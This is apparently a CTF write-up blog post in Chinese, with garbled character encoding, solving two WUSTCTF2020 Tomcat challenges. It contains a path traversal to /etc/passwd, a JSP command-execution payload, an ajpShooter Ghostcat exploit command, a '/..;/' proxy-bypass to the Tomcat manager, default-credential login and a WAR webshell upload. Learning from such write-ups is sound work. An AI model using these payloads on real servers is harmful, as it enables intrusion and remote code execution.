<p>æ ¹æ®tomcat serverçš„ç»“æ„ï¼Œè®¿é—®web.xmlï¼Œæ‰“å¼€ååŒ…å«å¦‚ä¸‹ä»£ç ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;welcome-file-list&gt;</span><br><span class="line">        &lt;welcome-file&gt;&#x2F;WEB-INF&#x2F;views&#x2F;index.jsp&lt;&#x2F;welcome-file&gt;</span><br><span class="line">&lt;&#x2F;welcome-file-list&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸»é¡µæ˜¯<code>/views/index.jsp</code>,ä¸Šä¼ åçš„æ–‡ä»¶ä¿å­˜åœ¨<code>uploads</code>ä¸­ï¼Œä½†æˆ‘ä»¬æ— æ³•ç›´æ¥è®¿é—®åˆ°uploadsï¼Œå› æ­¤è¿˜æ˜¯ä¸èƒ½ç›´æ¥ä¸Šä¼ ä»£ç getshell.</p>
<img src="/ctf/WUSTCTF2020/7777.png" class="">

<p>å› æ­¤æœ‰ä¸ƒå±‚ç›®å½•ï¼Œè¯•è¯•ç›®å½•ç©¿è¶Š<code>download?file=../../../../../../../etc/passwd</code>èƒ½å¤Ÿä¸‹è½½passwdæ–‡ä»¶</p>
<p>çœ‹ä¸€äº›wpè¯´ï¼Œæ¯”èµ›çš„æ—¶å€™å¯ä»¥åœ¨ä¸‹è½½passwdæ–‡ä»¶ä¹‹åæ‰¾åˆ°ç”¨æˆ·åå­—<code>tomajp</code>ï¼Œç„¶åæ‰¾è¯¥ç”¨æˆ·æ‰§è¡Œçš„å‘½ä»¤ <code>/home/tomajp/.bash_history</code>,ä»è€Œæ‰¾åˆ°flagæ‰€åœ¨çš„ä½ç½®ã€‚</p>
<p>ä½†è¿™æ˜¯éé¢„æœŸè§£ï¼Œé¢„æœŸè§£è¦é…åˆå¹½çµçŒ«æ¼æ´è§£ã€‚</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">java.io.InputStream in = Runtime.getRuntime().exec(<span class="string">"ls / -al"</span>).getInputStream();</span><br><span class="line"><span class="keyword">int</span> a = -<span class="number">1</span>;</span><br><span class="line"><span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span><br><span class="line">out.print(<span class="string">"&lt;pre&gt;"</span>);</span><br><span class="line"><span class="keyword">while</span>((a=in.read(b))!=-<span class="number">1</span>)&#123;</span><br><span class="line">    out.println(<span class="keyword">new</span> String(b));</span><br><span class="line">&#125;</span><br><span class="line">out.print(<span class="string">"&lt;/pre&gt;"</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>ä¸€å¼€å§‹è¿™ä¸ªpocæœ‰ç‚¹é—®é¢˜ï¼Œæ²¡æœ‰åˆ›å»ºå›æ˜¾æ‰€ä»¥æ— æ³•æˆåŠŸï¼Œç„¶åæ˜Ÿæ˜Ÿæ”¹äº†ä¹‹åå°±å¥½äº†ã€‚</p>
<h3 id="Tomcatæ–‡ä»¶åŒ…å«æ¼æ´"><a href="#Tomcatæ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="Tomcatæ–‡ä»¶åŒ…å«æ¼æ´"></a>Tomcatæ–‡ä»¶åŒ…å«æ¼æ´</h3><p>Tomcatæ˜¯ä¸€ä¸ªè¿è¡ŒJAVAçš„ç½‘ç»œæœåŠ¡å™¨ï¼Œè¢«æ™®éä½¿ç”¨åœ¨è½»é‡çº§Webåº”ç”¨æœåŠ¡çš„æ„æ¶ä¸­ã€‚</p>
<p>Tomcat AJPåè®®ç”±äºå­˜åœ¨å®ç°ç¼ºé™·å¯¼è‡´ç›¸å…³å‚æ•°å¯æ§ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚è‹¥æœåŠ¡å™¨ç«¯åŒæ—¶å­˜åœ¨æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½ï¼Œæ”»å‡»è€…å¯è¿›ä¸€æ­¥å®ç°è¿œç¨‹ä»£ç çš„æ‰§è¡Œã€‚</p>
<p>è¿™ç¯‡æ–‡ç« å¯¹Tomcatè§£é‡Šçš„éå¸¸è¯¦ç»†<a href="https://segmentfault.com/a/1190000013122831" target="_blank" rel="noopener">https://segmentfault.com/a/1190000013122831</a></p>
<h3 id="è§£é¢˜"><a href="#è§£é¢˜" class="headerlink" title="è§£é¢˜"></a>è§£é¢˜</h3><p>è¿™é‡Œè®°å½•ä¸€ä¸‹å…·ä½“çš„æ“ä½œè¿‡ç¨‹ï¼Œå› ä¸ºæˆ‘ä¹‹å‰ä¸å¤ªä¼šåšè¿™ç±»çš„é¢˜ã€‚</p>
<p>ç”±äºbuuçš„é¶æœºæ²¡ç½‘ï¼Œè¦é€šè¿‡å†…ç½‘é¶æœºæ¥è®¿é—®8009ç«¯å£ï¼Œæ‰€ä»¥ç”¨åˆ«çš„å·å¼€ä¸€ä¸ªå§å”§è¿æ¥ã€‚</p>
<p>æ­¤æ¬¡è§£é¢˜è¿‡ç¨‹ç”¨åˆ°<a href="![](http://q9r2u05bd.bkt.clouddn.com/%E5%BC%A0%E9%9B%AA2019081306025.docx)">é’ˆå¯¹Tomcatæ–‡ä»¶åŒ…å«æ¼æ´çš„exp</a></p>
<p>å…ˆç”¨scpå‘½ä»¤æŠŠexpä¼ åˆ°å§å”§ä¸Šå»ã€‚è¿è¡Œä¸€ä¸‹</p>
<img src="/ctf/WUSTCTF2020/8888.png" class="">

<p>å†ä¸Šä¼ 111.jspåˆ°é¢˜ç›®é‡Œï¼Œåˆ—å‡ºç›®å½•ä¸‹çš„æ–‡ä»¶ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 ajpShooter.py http:&#x2F;&#x2F;1037-2be0082a-ce1a-44f0-87f2-19f8256a3cfa 8009 &#x2F;WEB-INF&#x2F;uploads&#x2F;85463566-b208-4f9a-bf2c-c82b90772106.jsp eval</span><br></pre></td></tr></table></figure>

<img src="/ctf/WUSTCTF2020/9999.png" class="">

<p>æ‰¾åˆ°flagäº†ï¼æ›´æ”¹pocå†ä¼ ä¸Šå»ã€‚</p>
<img src="/ctf/WUSTCTF2020/0000.png" class="">



<h1 id="Train-Yourself-To-Be-Godly"><a href="#Train-Yourself-To-Be-Godly" class="headerlink" title="Train Yourself To Be Godly"></a>Train Yourself To Be Godly</h1><p>è¿™é“é¢˜åˆæ˜¯å…³äºApache Tomcatçš„ã€‚</p>
<img src="/ctf/WUSTCTF2020/1.png" class="">

<p>æ‰€ä»¥æˆ‘åˆæ²¡åšå‡ºæ¥ï¼Œæ˜¯çœ‹ç€ç½‘ä¸Šå¸ˆå‚…ä»¬çš„wpåšçš„QAQï¼Œä½†ä¸å¾—ä¸è¯´è¿™é“é¢˜è®©æˆ‘å­¦ä¼šäº†å¥½å‡ ä¸ªçŸ¥è¯†ç‚¹ã€‚ğŸ‘</p>
<h2 id="Tomcatç›®å½•ç©¿è¶Š"><a href="#Tomcatç›®å½•ç©¿è¶Š" class="headerlink" title="Tomcatç›®å½•ç©¿è¶Š"></a>Tomcatç›®å½•ç©¿è¶Š</h2><p>è¿™é“é¢˜æ˜¯ç”¨Nginxåšåå‘ä»£ç†ï¼Œä½†åç«¯ç”¨çš„ä¸­é—´ä»¶æ˜¯Tomcatï¼Œå› æ­¤è¿™ä¸¤ç§ä¸­é—´ä»¶è¯†åˆ«çš„è·¯å¾„ä¸åŒï¼Œå°±ä¼šé€ æˆè§£æä¸ä¸€è‡´çš„æƒ…å†µã€‚</p>
<p><a href="https://www.youtube.com/watch?v=28xWcRegncw" target="_blank" rel="noopener">DEF CON 26 - Orange Tsai</a>orangeåœ¨defconä¸Šçš„ä¸€ä¸ªè®®é¢˜ï¼Œè¿™æ˜¯ä»–çš„<a href="https://www.cisoplatform.com/profiles/blogs/breaking-parser-logic-take-your-path-normalization-off-and-pop" target="_blank" rel="noopener">ppt</a>ã€‚</p>
<p>reverse proxy architecture</p>
<ul>
<li>Share resourse</li>
<li>Load balance</li>
<li>Cache</li>
<li>Security</li>
</ul>
<img src="/ctf/WUSTCTF2020/2.png" class="">

<img src="/ctf/WUSTCTF2020/4.png" class="">

<p>ç”±ä¸Šå›¾å¯çŸ¥ï¼Œå½“è§£æ<code>http://example.com/foo;name=orange/bar</code>æ—¶ï¼ŒApache,Nginx,IISç­‰ä¼šè§£ææˆ<code>/foo;name=orange/bar</code>,è€ŒTomcatã€Jettyç­‰ä¸­é—´ä»¶ä¼šä½¿ç”¨<code>cleanpath</code>å‡½æ•°å¯¹<code>path</code>å¤„ç†ï¼Œè¿™é‡Œæœ‰ä¸€ç¯‡è®²è§£äº†ç”¨jettyåšä¸­é—´ä»¶çš„<a href="https://paper.seebug.org/665/" target="_blank" rel="noopener">Spring MVC ç›®å½•ç©¿è¶Šæ¼æ´</a>å¯¹<code>cleanpath</code>å‡½æ•°å…è®¸ç©ºå…ƒç´ é€ æˆçš„ç›®å½•ç©¿è¶Šé—®é¢˜ã€‚</p>
<img src="/ctf/WUSTCTF2020/8.png" class="">

<p>éšæ‰‹æ‰“ä¸€ä¸ªç›®å½•ï¼Œå¯çŸ¥æˆ‘ä»¬ç°åœ¨æ˜¯åœ¨<code>/examples</code>ç›®å½•ä¸‹ï¼Œæ‰€ä»¥åªéœ€è¦ç©¿è¶Šä¸€å±‚ã€‚</p>
<p>å› æ­¤ï¼Œåœ¨æœ¬é¢˜ä¸­ï¼ŒNginxä¼šè®¤ä¸º<code>/..;/</code>æ˜¯ä¸€ä¸ªåˆæ³•çš„ç›®å½•è¯·æ±‚ï¼Œå¹¶å°†å®ƒå‘é€ç»™åç«¯çš„é¢Tomcatè§£æï¼Œä½†Tomcatåšè§£æçš„æ—¶å€™ä¼šå°†<code>;</code>å¤„ç†æ‰ï¼Œå› æ­¤å¤„ç†æ‰åå°±å˜æˆäº†<code>/../</code>ã€‚å› æ­¤å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•ç»•è¿‡Nginxçš„åå‘ä»£ç†ï¼Œä»è€Œè¯·æ±‚åˆ°æˆ‘ä»¬å¸Œæœ›è¯·æ±‚çš„éæ³•è·¯å¾„ã€‚æ‰€ä»¥åœ¨æœ¬é¢˜ä¸­å¯ä»¥é€šè¿‡æ„é€ <code>/..;/manager/html</code>è¿›å…¥Tomcatåå°ç®¡ç†ç•Œé¢ã€‚</p>
<p>åœ¨åå°ç®¡ç†ç•Œé¢ä¸Šå¯ä»¥éƒ¨ç½²waråŒ…ï¼Œå¦‚æœèƒ½ä¸Šä¼ waråŒ…ä¸Šå»å¹¶æ‰§è¡Œjspä»£ç ï¼Œå°±èƒ½å¤Ÿæ‹¿åˆ°shellæ‰§è¡Œå‘½ä»¤äº†ã€‚è€ŒwaråŒ…æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿æˆ‘å¦å¤–å†™äº†ä¸€ç¯‡æ–‡ç« æ¥è®°å½•ã€‚</p>
<h2 id="Tomcatç®¡ç†åå°"><a href="#Tomcatç®¡ç†åå°" class="headerlink" title="Tomcatç®¡ç†åå°"></a>Tomcatç®¡ç†åå°</h2><img src="/ctf/WUSTCTF2020/5.png" class="">

<p>è¿™é‡Œéœ€è¦è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ã€‚</p>
<blockquote>
<p>ä¸€èˆ¬æ¥è¯´ç”Ÿäº§ç¯å¢ƒç®¡ç†ç•Œé¢ /manager/html éƒ½æ˜¯è¦åˆ é™¤çš„ï¼Œå¦‚æœå¯ä»¥è®¿é—®ä¸€èˆ¬éƒ½æ˜¯é»˜è®¤å£ä»¤æˆ–è€…å¼±å£ä»¤ã€‚Tomcat æœ‰ä¸¤ä¸ªé»˜è®¤çš„åå°ç”¨æˆ·ï¼Œç”¨æˆ·ååˆ†åˆ«æ˜¯ tomcat å’Œ role1ï¼Œç”¨ tomcat ä½œä¸ºç”¨æˆ·åçˆ†ç ´ï¼Œå¯ä»¥å¾—åˆ°å¼±å£ä»¤ tomcat / tomcatã€‚ï¼ˆé»˜è®¤å¯†ç  tomcat / managerï¼‰</p>
</blockquote>
<p>å€Ÿç”¨åˆ«çš„å¸ˆå‚…è¯´çš„è¯ã€‚</p>
<img src="/ctf/WUSTCTF2020/6.png" class="">

<p>æˆåŠŸç™»é™†è¿›ç®¡ç†åå°ã€‚</p>
<h2 id="ä¸Šä¼ WAR"><a href="#ä¸Šä¼ WAR" class="headerlink" title="ä¸Šä¼ WAR"></a>ä¸Šä¼ WAR</h2><p>è¿™ä¸€æ­¥å°±æ˜¯ä¸Šä¼ waråŒ…äº†ã€‚æˆ‘æ‰¾äº†ä¸ªå¸ˆå‚…çš„<a href="https://github.com/LandGrey/webshell-detect-bypass/blob/master/webshell/jsp/ProcessBuilder-cmd.jsp" target="_blank" rel="noopener">jspæœ¨é©¬</a>ã€‚</p>
<p>å°†jspä»£ç æ‰“åŒ…æˆwar</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">jar -cvf shell.war 111.jsp</span><br></pre></td></tr></table></figure>

<img src="/ctf/WUSTCTF2020/7.png" class="">

<p>404äº†ï¼Œä½†ä»æŠ¥é”™å¯ä»¥çœ‹å‡ºç›®å½•æ‹¼æ¥åæ˜¯<code>examples/manager/html/upload</code>,å› æ­¤å†åŠ ä¸€ä¸ª<code>/..;/</code>ã€‚</p>
<img src="/ctf/WUSTCTF2020/9.png" class="">

<p>403 Access Deniedï¼Œè¯´æ˜æˆ‘ä»¬ğŸˆšï¸æƒé™ä¸Šä¼ ã€‚</p>
<img src="/ctf/WUSTCTF2020/10.png" class="">

<p>å¹¶æ²¡æœ‰cookieï¼Œä½†è¿™æ˜¯å› ä¸ºæˆ‘ä»¬é€šè¿‡ç©¿è¶Šç›®å½•è®¿é—®åˆ°çš„<code>/manager/html</code>ï¼Œæ‰€ä»¥æˆ‘ä»¬è®¿é—®çš„<code>/..;/manager/html</code>æ— æ³•è·å¾—ä¹‹å‰çš„Cookieï¼Œæ‰€ä»¥ä¼šæƒé™ä¸è¶³ã€‚</p>
<p>æ‰€ä»¥ç°åœ¨æˆ‘ä»¬åº”è¯¥ä¿®æ”¹ä¸€å¼€å§‹è®¿é—®åˆ°çš„<code>/manager/html</code>çš„cookieè·¯å¾„ï¼Œä½¿å®ƒèƒ½å¤Ÿè®©<code>/..;/manager/html</code>ç•Œé¢ä¹ŸæˆåŠŸä½¿ç”¨ã€‚å¦‚æœèƒ½å¤Ÿè®¾ç½®cookieçš„è·¯å¾„ï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠè¿™ä¸ªcookieåŠ åˆ°ä¸Šä¼ çš„é¡µé¢ä¸­ï¼Œè¿™æ ·å°±ä¼šç»•è¿‡403äº†ã€‚ä½†æ€ä¹ˆæ ·ä¿®æ”¹cookieçš„è·¯å¾„å‘¢ï¼Ÿ</p>
<h2 id="ä¿®æ”¹cookie"><a href="#ä¿®æ”¹cookie" class="headerlink" title="ä¿®æ”¹cookie"></a>ä¿®æ”¹cookie</h2><p>cookieå°±æ˜¯ä¸€ç§æµè§ˆå™¨ç®¡ç†çŠ¶æ€çš„ä¸€ä¸ªæ–‡ä»¶ï¼Œå®ƒæœ‰nameï¼Œä¹Ÿæœ‰valueï¼Œè¿˜æœ‰Domainã€pathç­‰ç­‰ã€‚</p>
<img src="/ctf/WUSTCTF2020/11.png" class="">

<p>æœåŠ¡å™¨é€šè¿‡responseå“åº”å¤´çš„set-Cookieå­—æ®µæ¥è®©å®¢æˆ·ç«¯åœ¨æœ¬åœ°Cookieä¸­è®°å½•ä¿¡æ¯ï¼Œä¾‹å¦‚</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">[HTTP/1.1 200 OK]</span><br><span class="line"><span class="attribute">Server:[bfe/1.0.8.18]</span></span><br><span class="line"><span class="attribute">Etag:["58860415-98b"]</span></span><br><span class="line">Cache-Control:[private, no-cache, no-store, proxy-revalidate, no-transform]</span><br><span class="line"><span class="attribute">Connection:[Keep-Alive]</span></span><br><span class="line">Set-Cookie:[BDORZ=27315; max-age=86400; domain=.baidu.com; path=/]</span><br><span class="line"><span class="attribute">Pragma:[no-cache]</span></span><br><span class="line">Last-Modified:[Mon, 23 Jan 2017 13:24:37 GMT]</span><br><span class="line"><span class="attribute">Content-Length:[2443]</span></span><br><span class="line">Date:[Mon, 09 Apr 2018 09:59:06 GMT]</span><br><span class="line"><span class="attribute">Content-Type:[text/html]</span></span><br></pre></td></tr></table></figure>

<p>ä½†cookieåœ¨å®¢æˆ·ç«¯ä¹Ÿæ˜¯å¯æ§çš„ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨æµè§ˆå™¨ç›´æ¥è®¿é—®æœåŠ¡å™¨ï¼Œå½“æœåŠ¡å™¨å¸®æˆ‘ä»¬setcookieåï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡æµè§ˆå™¨æˆ–è€…æ’ä»¶è¿›è¡Œæ›´æ”¹ï¼Œä¾‹å¦‚åœ¨ç«ç‹ä¸Šï¼š</p>
<img src="/ctf/WUSTCTF2020/12.png" class="">

<p>cookieçš„å„ä¸ªå‚æ•°æˆ‘ä»¬éƒ½å¯ä»¥æ›´æ”¹ã€‚</p>
<p>ä½†å¦‚æœæˆ‘ä»¬ä½¿ç”¨burpsuiteåšä»£ç†ï¼Œé‚£ä¹ˆæµç¨‹å°±å˜ä¸ºï¼šæˆ‘ä»¬å°†è¯·æ±‚å‘ç»™burpï¼Œburpå†å‘é€ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨æŠŠcookieä¿¡æ¯å“åº”ç»™burpï¼Œburpå†ä¼ ç»™æˆ‘ä»¬ã€‚æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹burpè¿”å›çš„å“åº”åŒ…æ¥ä¿®æ”¹cookieçš„å€¼ã€‚</p>
<p>é¡ºä¾¿è®°å½•ä¸€ä¸‹æŠ“responseåŒ…çš„æ–¹æ³•</p>
<img src="/ctf/WUSTCTF2020/13.png" class="">

<p>å¯¹äºæœ¬é¢˜ï¼Œæˆ‘ä»¬å¸Œæœ›ä¿®æ”¹ä¸€å¼€å§‹è®¿é—®çš„<code>/manager/html</code>çš„cookie pathæˆ<code>/..;/manager/html</code>ï¼Œä½¿ä¹‹ååœ¨ä¸Šä¼ æ—¶ä¹Ÿèƒ½ä½¿ç”¨è¿™ä¸ªcookieï¼Œä»è€Œæ‹¥æœ‰ä¸Šä¼ waråŒ…çš„æƒé™ã€‚</p>
<img src="/ctf/WUSTCTF2020/14.png" class="">

<p>å†å°†è¿™ä¸ªcookieå¤åˆ¶åˆ°ä¸Šä¼ æ–‡ä»¶çš„åœ°æ–¹</p>
<img src="/ctf/WUSTCTF2020/15.png" class="">

<p>ä¼ ä¸Šå»äº†ä¼ ä¸Šå»äº†ï¼</p>
<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><img src="/ctf/WUSTCTF2020/16.png" class="">

<p>ä¸‹ä¸€æ­¥å°±æ˜¯è®¿é—®ä¼ ä¸Šå»çš„æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥<code>echo $FLAG</code>ï¼Œç”¨findçš„è¯æ¯”è¾ƒå®¹æ˜“å¡ã€‚</p>
<p>ç„¶åå°±èƒ½å¾—åˆ°flagäº†ï¼</p>
<p><strong>æ€»çš„æ¥è¯´è¿™é“é¢˜çš„çŸ¥è¯†ç‚¹è¿˜è›®å¤šçš„ï¼Œå‡ºé¢˜äººå¥½å‰å®³ï¼</strong></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Neorah</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://neorah.me/ctf/WUSTCTF2020/">https://neorah.me/ctf/WUSTCTF2020/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" target="_blank" rel="noopener">CC BY-NC-SA 3.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/python/">python</a><a class="post-meta__tags" href="/tags/%E5%91%BD%E4%BB%A4%E7%BB%95%E8%BF%87/">å‘½ä»¤ç»•è¿‡</a><a class="post-meta__tags" href="/tags/Tomcat/">Tomcat</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/ctf/RCTF2015/"><i class="fa fa-chevron-left">  </i><span>[RCTF2015]EasySQL</span></a></div><div class="next-post pull-right"><a href="/ctf/HFCTF2020/"><span>[HFCTF2020]WEB WP</span><i class="fa fa-chevron-right"></i></a></div></nav></div></div><footer class="footer-bg" style="background-image: url(/img/top.JPG)"><div class="layout" id="footer"><div class="copyright">&copy;2020 By Neorah</div><div class="footer_custom_text">Theme By melody</div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file-o"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="/js/third-party/anime.min.js"></script><script src="/js/third-party/jquery.min.js"></script><script src="/js/third-party/jquery.fancybox.min.js"></script><script src="/js/third-party/velocity.min.js"></script><script src="/js/third-party/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.7.0"></script><script src="/js/fancybox.js?version=1.7.0"></script><script src="/js/sidebar.js?version=1.7.0"></script><script src="/js/copy.js?version=1.7.0"></script><script src="/js/fireworks.js?version=1.7.0"></script><script src="/js/transition.js?version=1.7.0"></script><script src="/js/scroll.js?version=1.7.0"></script><script src="/js/head.js?version=1.7.0"></script><script src="/js/search/algolia.js"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script><div class="search-dialog" id="algolia-search"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fa fa-times"></i></span></div><div class="search-mask"></div></body></html>